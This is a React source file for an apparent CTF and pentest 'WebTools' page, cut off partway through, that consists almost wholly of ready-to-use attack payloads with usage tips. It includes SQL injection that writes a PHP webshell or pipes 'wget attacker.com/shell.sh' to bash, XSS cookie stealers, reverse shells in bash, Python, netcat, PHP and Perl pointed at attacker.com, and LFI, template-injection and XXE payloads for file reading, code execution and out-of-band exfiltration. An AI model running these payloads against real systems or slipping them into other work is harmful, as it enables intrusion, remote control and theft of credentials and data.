import React, { useState, useEffect } from 'react'
import {
  Globe,
  Search,
  Shield,
  Code,
  Terminal,
  Copy,
  ExternalLink,
  FileCode,
  Zap,
  Database,
  Lock,
  Bug,
  Server,
  Eye,
  Download,
  FolderOpen,
  Star,
  Play,
  Hash,
  Link2,
  FileJson,
  Boxes,
  Radio,
  Cloud,
  Key,
  BookOpen,
  GitBranch
} from 'lucide-react'
import { Button } from '../components/ui/button'
import { Card } from '../components/ui/card'
import { Input } from '../components/ui/input'

interface Payload {
  name: string
  category: string
  payload: string
  description: string
  usage: string
}

interface Technique {
  name: string
  category: string
  description: string
  steps: string[]
  examples: string[]
}

const WebTools: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'sqli' | 'xss' | 'rce' | 'lfi' | 'ssti' | 'xxe' | 'csrf' | 'ssrf' | 'nosql' | 'graphql' | 'jwt' | 'directory' | 'fingerprint' | 'cms' | 'api' | 'waf' | 'polyglot' | 'unicode' | 'encoding' | 'techniques' | 'deserialization' | 'smuggling' | 'oauth' | 'websocket' | 'prototype' | 'cache' | 'race'>('sqli')
  const [searchTerm, setSearchTerm] = useState('')
  const [selectedCategory, setSelectedCategory] = useState('all')
  const [customPayload, setCustomPayload] = useState('')
  const [obfuscationLevel, setObfuscationLevel] = useState<'low' | 'medium' | 'high'>('medium')

  // Payload Management State
  const [favorites, setFavorites] = useState<string[]>([])
  const [showFavoritesOnly, setShowFavoritesOnly] = useState(false)

  // Interactive Testing Tools State
  const [testInput, setTestInput] = useState('')
  const [testOutput, setTestOutput] = useState('')
  const [hashInput, setHashInput] = useState('')
  const [hashOutput, setHashOutput] = useState('')
  const [encoderChain, setEncoderChain] = useState<string[]>([])

  // Load favorites from localStorage
  useEffect(() => {
    const savedFavorites = localStorage.getItem('webtools_favorites')
    if (savedFavorites) {
      setFavorites(JSON.parse(savedFavorites))
    }
  }, [])

  // Save favorites to localStorage
  useEffect(() => {
    localStorage.setItem('webtools_favorites', JSON.stringify(favorites))
  }, [favorites])

  // SQL Injection Payloads for CTF
  const sqlPayloads: Payload[] = [
    {
      name: "Basic Union Select",
      category: "Union-based",
      payload: "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
      description: "Basic union select to identify injectable columns",
      usage: "Use in URL parameters or form fields to detect column count"
    },
    {
      name: "Database Information",
      category: "Information Gathering",
      payload: "' UNION SELECT 1,@@version,@@datadir,user(),database(),6--",
      description: "Extract database version, data directory, current user and database",
      usage: "MySQL information gathering payload"
    },
    {
      name: "Table Enumeration",
      category: "Information Gathering", 
      payload: "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
      description: "List all tables in current database",
      usage: "MySQL table discovery"
    },
    {
      name: "Column Enumeration",
      category: "Information Gathering",
      payload: "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
      description: "List all columns in the 'users' table",
      usage: "Replace 'users' with target table name"
    },
    {
      name: "Data Extraction",
      category: "Data Extraction",
      payload: "' UNION SELECT 1,group_concat(username,':',password),3 FROM users--",
      description: "Extract usernames and passwords from users table",
      usage: "Common CTF flag extraction method"
    },
    {
      name: "Boolean Blind SQLi",
      category: "Blind SQLi",
      payload: "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
      description: "Boolean-based blind SQL injection to extract data character by character",
      usage: "Use when no direct output is visible"
    },
    {
      name: "Time-based Blind SQLi",
      category: "Blind SQLi",
      payload: "'; SELECT IF(1=1,SLEEP(5),0)--",
      description: "Time-based blind SQL injection with 5 second delay",
      usage: "MySQL time-based payload for blind injection"
    },
    {
      name: "PostgreSQL Information",
      category: "PostgreSQL",
      payload: "' UNION SELECT 1,version(),current_database(),current_user,5--",
      description: "PostgreSQL version and database information",
      usage: "PostgreSQL specific information gathering"
    },
    {
      name: "SQLite Information",
      category: "SQLite",
      payload: "' UNION SELECT 1,name,sql FROM sqlite_master WHERE type='table'--",
      description: "SQLite table structure discovery",
      usage: "Common in CTF challenges using SQLite"
    },
    {
      name: "Second Order SQLi",
      category: "Advanced",
      payload: "admin'||(SELECT CASE WHEN (1=1) THEN 'admin' ELSE '' END)||'",
      description: "Second-order SQL injection payload",
      usage: "When injection occurs during data retrieval, not insertion"
    },
    {
      name: "MSSQL Error-based",
      category: "MSSQL",
      payload: "' AND 1=CAST((SELECT @@version) AS INT)--",
      description: "MSSQL error-based information disclosure",
      usage: "Microsoft SQL Server specific error-based injection"
    },
    {
      name: "Oracle Information",
      category: "Oracle",
      payload: "' UNION SELECT 1,banner FROM v$version--",
      description: "Oracle database version information",
      usage: "Oracle specific system information extraction"
    },
    {
      name: "Stacked Queries",
      category: "Advanced",
      payload: "'; DROP TABLE users--",
      description: "Stacked query for executing multiple statements",
      usage: "Works on databases that support multiple queries (PostgreSQL, MSSQL)"
    },
    {
      name: "Out-of-Band (OOB) MySQL",
      category: "Out-of-Band",
      payload: "' UNION SELECT 1,LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.attacker.com\\\\share'))--",
      description: "Out-of-band data exfiltration via UNC path",
      usage: "MySQL on Windows - exfiltrate data via DNS/SMB"
    },
    {
      name: "File Read MySQL",
      category: "File Operations",
      payload: "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--",
      description: "Read local files using MySQL LOAD_FILE",
      usage: "Requires FILE privilege"
    },
    {
      name: "File Write MySQL",
      category: "File Operations",
      payload: "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--",
      description: "Write webshell to filesystem using INTO OUTFILE",
      usage: "Requires FILE privilege and writable web directory"
    },
    {
      name: "WAF Bypass - Encoded",
      category: "WAF Bypass",
      payload: "%55%4e%49%4f%4e%20%53%45%4c%45%43%54",
      description: "URL encoded 'UNION SELECT' to bypass WAF",
      usage: "Encode keywords to evade signature-based WAF"
    },
    {
      name: "WAF Bypass - Comments",
      category: "WAF Bypass",
      payload: "/*!50000UNION*//*!50000SELECT*/",
      description: "MySQL version-specific comments to hide keywords",
      usage: "Comments are executed in specific MySQL versions"
    },
    {
      name: "MSSQL xp_cmdshell",
      category: "MSSQL",
      payload: "'; EXEC xp_cmdshell 'whoami'--",
      description: "Execute OS commands via xp_cmdshell",
      usage: "MSSQL RCE when xp_cmdshell is enabled"
    },
    {
      name: "PostgreSQL Command Execution",
      category: "PostgreSQL",
      payload: "'; COPY (SELECT '') TO PROGRAM 'wget http://attacker.com/shell.sh | bash'--",
      description: "PostgreSQL RCE using COPY TO PROGRAM",
      usage: "Execute system commands in PostgreSQL"
    },
    {
      name: "Authentication Bypass",
      category: "Authentication",
      payload: "admin' OR '1'='1'-- ",
      description: "Classic authentication bypass",
      usage: "Bypass login forms with simple OR condition"
    },
    {
      name: "JSON SQLi",
      category: "Modern",
      payload: "' UNION SELECT 1,JSON_EXTRACT(column_name, '$.password'),3 FROM users--",
      description: "Extract data from JSON columns",
      usage: "MySQL 5.7+ and PostgreSQL with JSON support"
    }
  ]

  // XSS Payloads for CTF
  const xssPayloads: Payload[] = [
    {
      name: "Basic Alert",
      category: "Basic XSS",
      payload: "<script>alert('XSS')</script>",
      description: "Basic JavaScript execution test",
      usage: "Test for reflected or stored XSS vulnerabilities"
    },
    {
      name: "Cookie Stealer",
      category: "Cookie Theft",
      payload: "<script>document.location='http://attacker.com/cookie.php?c='+document.cookie</script>",
      description: "Redirect to attacker server with stolen cookies",
      usage: "Replace attacker.com with your server for CTF challenges"
    },
    {
      name: "DOM XSS",
      category: "DOM XSS", 
      payload: "<img src=x onerror=alert(document.domain)>",
      description: "DOM-based XSS using image error handler",
      usage: "Works in contexts where script tags are filtered"
    },
    {
      name: "SVG XSS",
      category: "SVG",
      payload: "<svg onload=alert('XSS')>",
      description: "SVG-based JavaScript execution",
      usage: "Bypasses some XSS filters that don't handle SVG"
    },
    {
      name: "JavaScript URI",
      category: "URI-based",
      payload: "javascript:alert('XSS')",
      description: "JavaScript URI scheme execution",
      usage: "Use in href attributes or location changes"
    },
    {
      name: "Event Handler",
      category: "Event-based",
      payload: "<input onfocus=alert('XSS') autofocus>",
      description: "Auto-executing event handler XSS",
      usage: "Executes automatically when page loads"
    },
    {
      name: "Iframe XSS",
      category: "Iframe",
      payload: "<iframe src=javascript:alert('XSS')></iframe>",
      description: "Iframe-based JavaScript execution",
      usage: "Alternative when direct script injection is blocked"
    },
    {
      name: "Polyglot XSS",
      category: "Polyglot",
      payload: "'\"><img src=x onerror=alert('XSS')>",
      description: "Multi-context XSS payload",
      usage: "Works in various HTML contexts (attribute, tag, etc.)"
    },
    {
      name: "Filter Bypass",
      category: "Filter Evasion",
      payload: "<ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>",
      description: "Case variation and character encoding bypass",
      usage: "Bypasses simple case-sensitive filters"
    },
    {
      name: "Self-XSS to Stored",
      category: "Advanced",
      payload: "<script>fetch('/profile',{method:'POST',body:'bio=<script>alert(1)</script>'})</script>",
      description: "Convert self-XSS to stored XSS via AJAX",
      usage: "When you can only inject into your own profile"
    },
    {
      name: "Content Security Policy Bypass",
      category: "CSP Bypass",
      payload: "<script src='data:,alert(1)'></script>",
      description: "Data URI CSP bypass attempt",
      usage: "May work if data: scheme isn't blocked by CSP"
    },
    {
      name: "Template Injection XSS",
      category: "Template",
      payload: "{{constructor.constructor('alert(1)')()}}",
      description: "AngularJS template injection leading to XSS",
      usage: "Works in AngularJS template contexts"
    },
    {
      name: "XSS via Markdown",
      category: "Markdown",
      payload: "[Click me](javascript:alert('XSS'))",
      description: "XSS through Markdown link injection",
      usage: "When user input is rendered as Markdown"
    },
    {
      name: "XSS in Meta Refresh",
      category: "Meta Tag",
      payload: "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
      description: "XSS via meta refresh tag",
      usage: "Works when meta tags aren't sanitized"
    },
    {
      name: "XSS via Video/Audio",
      category: "Media",
      payload: "<video><source onerror=\"alert('XSS')\">",
      description: "XSS through HTML5 media elements",
      usage: "Alternative event handlers on media tags"
    },
    {
      name: "XSS via Object Tag",
      category: "Object",
      payload: "<object data=\"javascript:alert('XSS')\">",
      description: "JavaScript execution via object data attribute",
      usage: "Works in older browsers"
    },
    {
      name: "XSS via Form Action",
      category: "Form",
      payload: "<form action=\"javascript:alert('XSS')\"><input type=\"submit\">",
      description: "XSS through form action attribute",
      usage: "Requires user interaction to submit form"
    },
    {
      name: "Mutation XSS (mXSS)",
      category: "Advanced",
      payload: "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')>\">",
      description: "Mutation XSS through HTML parsing quirks",
      usage: "Exploits browser HTML parser mutations"
    },
    {
      name: "XSS via CSS Import",
      category: "CSS",
      payload: "<style>@import'http://attacker.com/xss.css';</style>",
      description: "XSS via external CSS with expression()",
      usage: "Old IE vulnerability, educational purpose"
    },
    {
      name: "XSS via XML",
      category: "XML",
      payload: "<xml><x:script>alert('XSS')</x:script></xml>",
      description: "XSS through XML namespaces",
      usage: "IE-specific XML namespace execution"
    },
    {
      name: "Reflected XSS in Error",
      category: "Error-based",
      payload: "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
      description: "XSS payload designed for error messages",
      usage: "Breaks out of error contexts with encoding"
    },
    {
      name: "WebSocket XSS",
      category: "WebSocket",
      payload: "<script>ws=new WebSocket('ws://attacker.com');ws.onopen=()=>ws.send(document.cookie);</script>",
      description: "XSS to exfiltrate data via WebSocket",
      usage: "Modern exfiltration technique"
    }
  ]

  // Remote Code Execution Payloads
  const rcePayloads: Payload[] = [
    {
      name: "Basic Command Injection",
      category: "Command Injection",
      payload: "; cat /etc/passwd",
      description: "Basic Linux command injection to read passwd file",
      usage: "Append to vulnerable parameters in web applications"
    },
    {
      name: "Windows Command Injection",
      category: "Command Injection",
      payload: "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
      description: "Windows command injection to read hosts file",
      usage: "Use in Windows environments"
    },
    {
      name: "PHP Code Injection",
      category: "Code Injection",
      payload: "<?php system($_GET['cmd']); ?>",
      description: "PHP webshell for command execution",
      usage: "Inject into file upload or eval() vulnerabilities"
    },
    {
      name: "Python Code Injection",
      category: "Code Injection",
      payload: "__import__('os').system('cat /etc/passwd')",
      description: "Python code injection to execute system commands",
      usage: "Use in Python eval() or exec() vulnerabilities"
    },
    {
      name: "Node.js Code Injection",
      category: "Code Injection",
      payload: "require('child_process').exec('cat /etc/passwd')",
      description: "Node.js code injection for command execution",
      usage: "Works in Node.js eval() contexts"
    },
    {
      name: "Reverse Shell - Bash",
      category: "Reverse Shell",
      payload: "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
      description: "Bash reverse shell connection",
      usage: "Replace attacker.com and port with your listener"
    },
    {
      name: "Reverse Shell - Python",
      category: "Reverse Shell",
      payload: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
      description: "Python reverse shell one-liner",
      usage: "Works when Python is available on target"
    },
    {
      name: "Web Shell Upload",
      category: "Web Shell",
      payload: "GIF89a<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>",
      description: "GIF header bypass web shell",
      usage: "Upload as .gif file, then access with ?cmd=command"
    },
    {
      name: "Log Poisoning",
      category: "Log Poisoning",
      payload: "<?php system($_GET['cmd']); ?>",
      description: "PHP code for log poisoning attacks",
      usage: "Inject into User-Agent or other logged headers"
    },
    {
      name: "Expression Language Injection",
      category: "EL Injection",
      payload: "${java.lang.Runtime.getRuntime().exec('cat /etc/passwd')}",
      description: "Java Expression Language injection",
      usage: "Works in Java web applications with EL processing"
    },
    {
      name: "Ruby Code Injection",
      category: "Code Injection",
      payload: "system('cat /etc/passwd')",
      description: "Ruby eval/instance_eval code execution",
      usage: "Works in Ruby on Rails eval() contexts"
    },
    {
      name: "Perl Command Injection",
      category: "Command Injection",
      payload: "; `cat /etc/passwd`",
      description: "Perl backtick command execution",
      usage: "Perl system command injection"
    },
    {
      name: "Java Deserialization RCE",
      category: "Deserialization",
      payload: "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb21wYXJhdG9ycy5UcmFuc2Zvcm1pbmdDb21wYXJhdG9y",
      description: "Java serialized payload for RCE (ysoserial)",
      usage: "Use ysoserial to generate full payload"
    },
    {
      name: "Reverse Shell - Netcat",
      category: "Reverse Shell",
      payload: "nc -e /bin/sh attacker.com 4444",
      description: "Netcat reverse shell",
      usage: "Traditional netcat reverse connection"
    },
    {
      name: "Reverse Shell - PHP",
      category: "Reverse Shell",
      payload: "php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
      description: "PHP reverse shell one-liner",
      usage: "Works when PHP CLI is available"
    },
    {
      name: "Reverse Shell - Perl",
      category: "Reverse Shell",
      payload: "perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
      description: "Perl reverse shell one-liner",
      usage: "Works on systems with Perl installed"
    },
    {
      name: "Command Injection - Pipe",
      category: "Command Injection",
      payload: "| whoami",
      description: "Pipe command injection",
      usage: "Alternative to semicolon when blocked"
    },
    {
      name: "Command Injection - Backtick",
      category: "Command Injection",
      payload: "`whoami`",
      description: "Backtick command substitution",
      usage: "Works in bash command injection"
    },
    {
      name: "Command Injection - $() ",
      category: "Command Injection",
      payload: "$(cat /etc/passwd)",
      description: "Dollar parentheses command substitution",
      usage: "Modern bash command substitution syntax"
    }
  ]

  // Local File Inclusion Payloads
  const lfiPayloads: Payload[] = [
    {
      name: "Basic LFI",
      category: "Basic LFI",
      payload: "../../../etc/passwd",
      description: "Basic directory traversal to read passwd file",
      usage: "Use in file parameter of web applications"
    },
    {
      name: "Windows LFI",
      category: "Windows LFI",
      payload: "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
      description: "Windows directory traversal to read hosts file",
      usage: "Use backslashes for Windows path traversal"
    },
    {
      name: "Null Byte LFI",
      category: "Null Byte",
      payload: "../../../etc/passwd%00",
      description: "Null byte termination to bypass file extension checks",
      usage: "Works in older PHP versions (< 5.3.4)"
    },
    {
      name: "Double Encoding",
      category: "Encoding Bypass",
      payload: "..%252f..%252f..%252fetc%252fpasswd",
      description: "Double URL encoded path traversal",
      usage: "Bypasses some input validation filters"
    },
    {
      name: "PHP Wrapper - Base64",
      category: "PHP Wrapper",
      payload: "php://filter/convert.base64-encode/resource=../../../etc/passwd",
      description: "PHP filter wrapper to base64 encode file contents",
      usage: "Useful for reading PHP files without execution"
    },
    {
      name: "PHP Wrapper - Data",
      category: "PHP Wrapper",
      payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
      description: "PHP data wrapper with base64 encoded PHP code",
      usage: "Base64 of: <?php system($_GET['cmd']); ?>"
    },
    {
      name: "Log File LFI",
      category: "Log Files",
      payload: "../../../var/log/apache2/access.log",
      description: "Read Apache access log file",
      usage: "Often contains poisonable user-controlled data"
    },
    {
      name: "Proc File LFI",
      category: "Proc Files",
      payload: "../../../proc/self/environ",
      description: "Read process environment variables",
      usage: "May contain sensitive configuration data"
    },
    {
      name: "Session File LFI",
      category: "Session Files",
      payload: "../../../tmp/sess_[SESSION_ID]",
      description: "Read PHP session files",
      usage: "Replace [SESSION_ID] with actual session ID"
    },
    {
      name: "LFI to RCE via Upload",
      category: "LFI to RCE",
      payload: "../../../tmp/uploaded_file.php",
      description: "Include uploaded file containing PHP code",
      usage: "Combine with file upload vulnerability"
    },
    {
      name: "PHP Input Wrapper",
      category: "PHP Wrapper",
      payload: "php://input",
      description: "Read POST data as file inclusion",
      usage: "Send PHP code in POST body: <?php system($_GET['cmd']); ?>"
    },
    {
      name: "Expect Wrapper RCE",
      category: "PHP Wrapper",
      payload: "expect://whoami",
      description: "Execute commands via expect:// wrapper",
      usage: "Requires expect PHP extension (rare)"
    },
    {
      name: "Zip Wrapper LFI",
      category: "PHP Wrapper",
      payload: "zip://archive.zip#shell.php",
      description: "Include file from within ZIP archive",
      usage: "Upload ZIP containing malicious PHP, then include"
    },
    {
      name: "Phar Deserialization",
      category: "PHP Wrapper",
      payload: "phar://malicious.phar/payload.php",
      description: "Phar deserialization leading to RCE",
      usage: "Upload phar file, trigger deserialization via phar://"
    },
    {
      name: "SSH Log Poisoning",
      category: "Log Files",
      payload: "../../../var/log/auth.log",
      description: "Read SSH authentication log",
      usage: "Poison by SSH login with PHP code as username"
    },
    {
      name: "Mail Log Poisoning",
      category: "Log Files",
      payload: "../../../var/log/mail.log",
      description: "Read mail server log",
      usage: "Send email with PHP code in headers"
    },
    {
      name: "FTP Log Poisoning",
      category: "Log Files",
      payload: "../../../var/log/vsftpd.log",
      description: "Read FTP server log",
      usage: "Login via FTP with PHP code as username"
    },
    {
      name: "Windows IIS Logs",
      category: "Windows LFI",
      payload: "..\\..\\..\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex[DATE].log",
      description: "Read IIS web server logs",
      usage: "Poison User-Agent, then include log file"
    }
  ]

  // Server Side Template Injection Payloads
  const sstiPayloads: Payload[] = [
    {
      name: "Jinja2 Basic",
      category: "Jinja2",
      payload: "{{ 7*7 }}",
      description: "Basic template injection test for Jinja2",
      usage: "Should output 49 if vulnerable to SSTI"
    },
    {
      name: "Jinja2 RCE",
      category: "Jinja2",
      payload: "{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}",
      description: "Jinja2 template injection leading to RCE",
      usage: "Python Flask applications using Jinja2"
    },
    {
      name: "Twig Basic",
      category: "Twig",
      payload: "{{ 7*7 }}",
      description: "Basic template injection test for Twig",
      usage: "PHP applications using Twig template engine"
    },
    {
      name: "Twig RCE",
      category: "Twig",
      payload: "{{ _self.env.registerUndefinedFilterCallback(\"exec\") }}{{ _self.env.getFilter(\"cat /etc/passwd\") }}",
      description: "Twig template injection leading to RCE",
      usage: "Symfony applications using Twig"
    },
    {
      name: "Smarty RCE",
      category: "Smarty",
      payload: "{php}echo `cat /etc/passwd`;{/php}",
      description: "Smarty template injection with PHP execution",
      usage: "PHP applications using Smarty template engine"
    },
    {
      name: "FreeMarker RCE",
      category: "FreeMarker",
      payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"cat /etc/passwd\") }",
      description: "FreeMarker template injection leading to RCE",
      usage: "Java applications using FreeMarker"
    },
    {
      name: "Velocity RCE",
      category: "Velocity",
      payload: "#set($str=$class.forName('java.lang.String'))#set($chr=$class.forName('java.lang.Character'))#set($ex=$class.forName('java.lang.Runtime').getRuntime().exec('cat /etc/passwd'))",
      description: "Velocity template injection leading to RCE",
      usage: "Java applications using Apache Velocity"
    },
    {
      name: "ERB RCE",
      category: "ERB",
      payload: "<%= system('cat /etc/passwd') %>",
      description: "ERB template injection in Ruby applications",
      usage: "Ruby on Rails applications using ERB templates"
    },
    {
      name: "Jinja2 Config Access",
      category: "Jinja2",
      payload: "{{ config.items() }}",
      description: "Access Flask configuration and secrets",
      usage: "Exfiltrate SECRET_KEY and other sensitive config"
    },
    {
      name: "Jinja2 File Read",
      category: "Jinja2",
      payload: "{{ ''.__class__.__mro__[1].__subclasses__()[414]('/etc/passwd').read() }}",
      description: "Read arbitrary files via object traversal",
      usage: "Adjust index [414] to match file object"
    },
    {
      name: "Jinja2 Reverse Shell",
      category: "Jinja2",
      payload: "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"').read() }}",
      description: "Execute reverse shell from Jinja2",
      usage: "Replace attacker.com with your listener"
    },
    {
      name: "Tornado Template RCE",
      category: "Tornado",
      payload: "{% import os %}{{ os.popen('whoami').read() }}",
      description: "Tornado template injection RCE",
      usage: "Python Tornado web framework"
    },
    {
      name: "Mako Template RCE",
      category: "Mako",
      payload: "${ __import__('os').popen('cat /etc/passwd').read() }",
      description: "Mako template injection for Python",
      usage: "Python applications using Mako templates"
    },
    {
      name: "Pug/Jade RCE",
      category: "Pug",
      payload: "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('whoami')}()}",
      description: "Pug (formerly Jade) template injection",
      usage: "Node.js applications using Pug"
    },
    {
      name: "Handlebars Prototype Pollution",
      category: "Handlebars",
      payload: "{{#with \"constructor\"}}{{#with split}}{{pop (push \"alert('XSS')\")}}{{/with}}{{/with}}",
      description: "Handlebars helper prototype pollution",
      usage: "May lead to XSS or RCE depending on context"
    },
    {
      name: "Thymeleaf SpEL Injection",
      category: "Thymeleaf",
      payload: "__${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}__::.x",
      description: "Spring Expression Language injection in Thymeleaf",
      usage: "Java Spring applications using Thymeleaf"
    },
    {
      name: "Jinja2 __import__ Bypass",
      category: "Jinja2",
      payload: "{{ [].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read() }}",
      description: "Alternative Jinja2 RCE using __import__",
      usage: "When direct imports are filtered"
    },
    {
      name: "Twig _self Enumeration",
      category: "Twig",
      payload: "{{_self.env.getCache()}}{{_self.env.getCharset()}}",
      description: "Enumerate Twig environment and filesystem",
      usage: "Information gathering in Twig templates"
    }
  ]

  // XXE Payloads
  const xxePayloads: Payload[] = [
    {
      name: "Basic XXE",
      category: "Basic XXE",
      payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
      description: "Basic XXE to read local files",
      usage: "Submit as XML payload to vulnerable XML parsers"
    },
    {
      name: "Blind XXE",
      category: "Blind XXE",
      payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><foo></foo>",
      description: "Blind XXE with external DTD",
      usage: "Use when no direct output is visible"
    },
    {
      name: "XXE via SVG",
      category: "SVG XXE",
      payload: "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>",
      description: "XXE injection via SVG file upload",
      usage: "Upload as SVG image file"
    },
    {
      name: "XXE SSRF",
      category: "SSRF",
      payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80/\">]><foo>&xxe;</foo>",
      description: "XXE to perform SSRF attacks",
      usage: "Access internal services via XML entity"
    },
    {
      name: "XXE DOS",
      category: "DOS",
      payload: "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"><!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"><!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\"><!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"><!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\"><!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">]><lolz>&lol9;</lolz>",
      description: "Billion Laughs XXE DOS attack",
      usage: "Can cause memory exhaustion in XML parsers"
    },
    {
      name: "XXE Parameter Entity",
      category: "Parameter Entity",
      payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><foo>&send;</foo>",
      description: "XXE using parameter entities for data exfiltration",
      usage: "evil.dtd: <!ENTITY % all \"<!ENTITY send SYSTEM 'http://attacker.com/?%file;'>\">%all;"
    },
    {
      name: "XXE via XLSX",
      category: "Office Files",
      payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData><row><c t=\"inlineStr\"><is><t>&xxe;</t></is></c></row></sheetData></worksheet>",
      description: "XXE in XLSX files (xl/workbook.xml)",
      usage: "Modify XLSX file and upload"
    },
    {
      name: "XXE via DOCX",
      category: "Office Files",
      payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>",
      description: "XXE in DOCX files (word/document.xml)",
      usage: "Inject into document.xml of DOCX archive"
    },
    {
      name: "XXE PHP Expect",
      category: "RCE",
      payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
      description: "XXE with expect:// for command execution",
      usage: "Requires expect PHP extension"
    },
    {
      name: "XXE Data Exfiltration OOB",
      category: "Out-of-Band",
      payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/exfil.dtd\">%dtd;%send;]><data>&exfil;</data>",
      description: "Out-of-band XXE data exfiltration with base64",
      usage: "Base64 encode file content for exfiltration"
    },
    {
      name: "XXE via SOAP",
      category: "SOAP",
      payload: "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>",
      description: "XXE injection in SOAP requests",
      usage: "Inject into SOAP envelope body"
    },
    {
      name: "XXE Local DTD Exploitation",
      category: "Error-based",
      payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % local SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"><!ENTITY % expr 'aaa)><!ENTITY xxe SYSTEM \"file:///etc/passwd\"><!ENTITY bbb (bb'>%local;]><foo>&xxe;</foo>",
      description: "Exploit local DTD files for error-based XXE",
      usage: "Works when external DTD is blocked"
    }
  ]

  // CSRF Payloads
  const csrfPayloads: Payload[] = [
    {
      name: "Basic CSRF HTML",
      category: "HTML Form",
      payload: "<form action=\"http://vulnerable-site.com/admin/delete-user\" method=\"POST\"><input type=\"hidden\" name=\"user_id\" value=\"123\"><input type=\"submit\" value=\"Click me!\"></form>",
